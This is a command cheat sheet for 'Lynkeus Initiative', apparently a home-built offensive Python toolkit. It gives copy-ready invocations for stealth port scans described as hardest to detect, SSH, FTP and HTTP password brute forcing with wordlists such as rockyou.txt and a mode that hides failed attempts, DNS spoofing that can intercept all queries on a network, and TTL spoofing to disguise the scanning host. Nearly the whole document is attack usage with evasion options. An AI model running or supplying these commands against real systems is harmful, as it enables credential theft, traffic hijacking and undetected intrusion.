# Lynkeus Initiative — Commands

---

## Setup

```bash
# Install all dependencies
pip install -r requirements.txt

# Navigate into the project folder
cd lynkeus
```

---

## Core Scanner

```bash
# Basic scan — ports 1 to 1024
python3 main.py 192.168.1.10

# Scan specific ports
python3 main.py 192.168.1.10 -p 22,80,443,3306,3389

# Scan a port range
python3 main.py 192.168.1.10 -p 1-500

# Full scan — all 65535 ports
python3 main.py 192.168.1.10 -p 1-65535

# Faster scan with more threads
python3 main.py 192.168.1.10 -p 1-65535 -w 200

# Slower scan with longer timeout
python3 main.py 192.168.1.10 -p 1-1024 -t 3.0 -w 20

# Save results to JSON
python3 main.py 192.168.1.10 -p 1-1024 -o results.json

# Scan by hostname
python3 main.py scanme.nmap.org -p 1-1024

# Full scan with all flags
python3 main.py 192.168.1.10 -p 1-65535 -t 1.5 -w 150 -o full_scan.json
```

---

## Stealth Scanner

```bash
# Low and slow — hardest to detect
python3 -c "from modules.stealth.stealth_scan import run_stealth_scan; run_stealth_scan('192.168.1.10', range(1, 1025), 1.0, 5, 1.0, 5.0)"

# Medium stealth — balanced speed and noise
python3 -c "from modules.stealth.stealth_scan import run_stealth_scan; run_stealth_scan('192.168.1.10', range(1, 1025), 1.0, 10, 0.5, 2.0)"

# Fast but still randomised
python3 -c "from modules.stealth.stealth_scan import run_stealth_scan; run_stealth_scan('192.168.1.10', range(1, 1025), 1.0, 20, 0.1, 0.5)"

# Specific ports only — stealthiest option
python3 -c "from modules.stealth.stealth_scan import run_stealth_scan; run_stealth_scan('192.168.1.10', [22, 80, 443, 3306, 3389], 1.0, 3, 2.0, 8.0)"
```

---

## SSH Brute Forcer

```bash
# Single username
python3 -c "from modules.credentials.ssh_brute import run_ssh_brute; run_ssh_brute('192.168.1.10', 22, ['admin'], 'wordlist.txt', 5, 0.5, 3.0, False)"

# Multiple usernames
python3 -c "from modules.credentials.ssh_brute import run_ssh_brute; run_ssh_brute('192.168.1.10', 22, ['admin', 'root', 'user'], 'wordlist.txt', 5, 0.5, 3.0, False)"

# Stealth mode — hides failed attempts
python3 -c "from modules.credentials.ssh_brute import run_ssh_brute; run_ssh_brute('192.168.1.10', 22, ['admin'], 'wordlist.txt', 2, 2.0, 3.0, True)"

# Custom SSH port
python3 -c "from modules.credentials.ssh_brute import run_ssh_brute; run_ssh_brute('192.168.1.10', 2222, ['admin'], 'wordlist.txt', 5, 0.5, 3.0, False)"

# With rockyou wordlist
python3 -c "from modules.credentials.ssh_brute import run_ssh_brute; run_ssh_brute('192.168.1.10', 22, ['admin', 'root'], 'rockyou.txt', 5, 0.5, 3.0, False)"
```

---

## FTP Brute Forcer

```bash
# Basic test — checks anonymous login first automatically
python3 -c "from modules.credentials.ftp_brute import run_ftp_brute; run_ftp_brute('192.168.1.10', 21, ['admin'], 'wordlist.txt', 5, 0.5, 3.0, False)"

# Multiple usernames
python3 -c "from modules.credentials.ftp_brute import run_ftp_brute; run_ftp_brute('192.168.1.10', 21, ['admin', 'ftp', 'user'], 'wordlist.txt', 5, 0.5, 3.0, False)"

# Stealth mode
python3 -c "from modules.credentials.ftp_brute import run_ftp_brute; run_ftp_brute('192.168.1.10', 21, ['admin'], 'wordlist.txt', 2, 2.0, 3.0, True)"

# Custom FTP port
python3 -c "from modules.credentials.ftp_brute import run_ftp_brute; run_ftp_brute('192.168.1.10', 2121, ['admin'], 'wordlist.txt', 5, 0.5, 3.0, False)"
```

---

## HTTP Brute Forcer

```bash
# Basic HTTP target
python3 -c "from modules.credentials.http_brute import run_http_brute; run_http_brute('http://192.168.1.10/admin', ['admin'], 'wordlist.txt', 5, 0.5, 3.0, False)"

# HTTPS target
python3 -c "from modules.credentials.http_brute import run_http_brute; run_http_brute('https://192.168.1.10/login', ['admin', 'root'], 'wordlist.txt', 5, 0.5, 3.0, False)"

# Multiple usernames
python3 -c "from modules.credentials.http_brute import run_http_brute; run_http_brute('http://192.168.1.10/admin', ['admin', 'administrator', 'root'], 'wordlist.txt', 5, 0.5, 3.0, False)"

# Stealth mode
python3 -c "from modules.credentials.http_brute import run_http_brute; run_http_brute('http://192.168.1.10/admin', ['admin'], 'wordlist.txt', 2, 2.0, 3.0, True)"
```

---

## ARP Scanner

```bash
# Scan your full /24 lab subnet
python3 -c "from modules.network.arp_scan import run_arp_scan; run_arp_scan('192.168.1.0/24', 2)"

# Larger /16 network — increase timeout
python3 -c "from modules.network.arp_scan import run_arp_scan; run_arp_scan('10.0.0.0/16', 5)"

# VirtualBox host-only network
python3 -c "from modules.network.arp_scan import run_arp_scan; run_arp_scan('192.168.56.0/24', 2)"

# VMware default subnet
python3 -c "from modules.network.arp_scan import run_arp_scan; run_arp_scan('192.168.138.0/24', 2)"
```

---

## DNS Spoofer

```bash
# Spoof a single domain
python3 -c "from modules.network.dns_spoof import run_dns_spoof; run_dns_spoof({'example.com': '192.168.1.100'}, '192.168.1.100', 'eth0', 0)"

# Spoof multiple domains at once
python3 -c "from modules.network.dns_spoof import run_dns_spoof; run_dns_spoof({'google.com': '192.168.1.100', 'facebook.com': '192.168.1.100'}, '192.168.1.100', 'eth0', 0)"

# Wildcard — intercept ALL DNS queries
python3 -c "from modules.network.dns_spoof import run_dns_spoof; run_dns_spoof({'*': '192.168.1.100'}, '192.168.1.100', 'eth0', 0)"

# Stop after 10 spoofed packets
python3 -c "from modules.network.dns_spoof import run_dns_spoof; run_dns_spoof({'example.com': '192.168.1.100'}, '192.168.1.100', 'eth0', 10)"

# Run on WiFi interface
python3 -c "from modules.network.dns_spoof import run_dns_spoof; run_dns_spoof({'example.com': '192.168.1.100'}, '192.168.1.100', 'wlan0', 0)"
```

---

## Packet Crafter

```bash
# Send TCP SYN to port 80
python3 -c "from modules.network.packet_craft import send_syn; send_syn('192.168.1.10', 80, 12345, 3, 2.0)"

# Send SYN to port 22
python3 -c "from modules.network.packet_craft import send_syn; send_syn('192.168.1.10', 22, 54321, 3, 2.0)"

# Send SYN to a closed port — expect RST
python3 -c "from modules.network.packet_craft import send_syn; send_syn('192.168.1.10', 9999, 11111, 2, 2.0)"

# Send ICMP with custom payload
python3 -c "from modules.network.packet_craft import send_icmp; send_icmp('192.168.1.10', 'LYNKEUS', 4, 2.0)"

# Send ICMP with large payload — test IDS detection
python3 -c "from modules.network.packet_craft import send_icmp; send_icmp('192.168.1.10', 'A'*100, 3, 2.0)"

# Send UDP to DNS port 53
python3 -c "from modules.network.packet_craft import send_udp; send_udp('192.168.1.10', 53, 'HELLO', 2, 2.0)"

# Send UDP to custom port
python3 -c "from modules.network.packet_craft import send_udp; send_udp('192.168.1.10', 1337, 'LYNKEUS', 3, 2.0)"
```

---

## TTL Spoofer

```bash
# Impersonate a Windows machine (TTL 128)
python3 -c "from modules.stealth.ttl_spoof import send_spoofed_syn; send_spoofed_syn('192.168.1.10', 80, 'windows', 3, 2.0)"

# Impersonate Linux (TTL 64)
python3 -c "from modules.stealth.ttl_spoof import send_spoofed_syn; send_spoofed_syn('192.168.1.10', 80, 'linux', 3, 2.0)"

# Impersonate macOS (TTL 64)
python3 -c "from modules.stealth.ttl_spoof import send_spoofed_syn; send_spoofed_syn('192.168.1.10', 80, 'macos', 3, 2.0)"

# Impersonate Cisco (TTL 255)
python3 -c "from modules.stealth.ttl_spoof import send_spoofed_syn; send_spoofed_syn('192.168.1.10', 80, 'cisco', 3, 2.0)"

# Fully randomised TTL per packet
python3 -c "from modules.stealth.ttl_spoof import send_spoofed_syn; send_spoofed_syn('192.168.1.10', 80, 'random', 5, 2.0)"

# Test against SSH port
python3 -c "from modules.stealth.ttl_spoof import send_spoofed_syn; send_spoofed_syn('192.168.1.10', 22, 'windows', 2, 2.0)"
```

---

## User Agent Rotator

```bash
# Print one random user agent
python3 -c "from modules.stealth.user_agent import get_random_agent; print(get_random_agent())"

# Print how many agents are in the pool
python3 -c "from modules.stealth.user_agent import get_agent_count; print(get_agent_count())"

# Print all available user agents
python3 -c "from modules.stealth.user_agent import get_all_agents; [print(a) for a in get_all_agents()]"
```

---

## Run All Modules At Once

```bash
# Edit the CONFIG section in test_all.py first, then run
python3 test_all.py
```
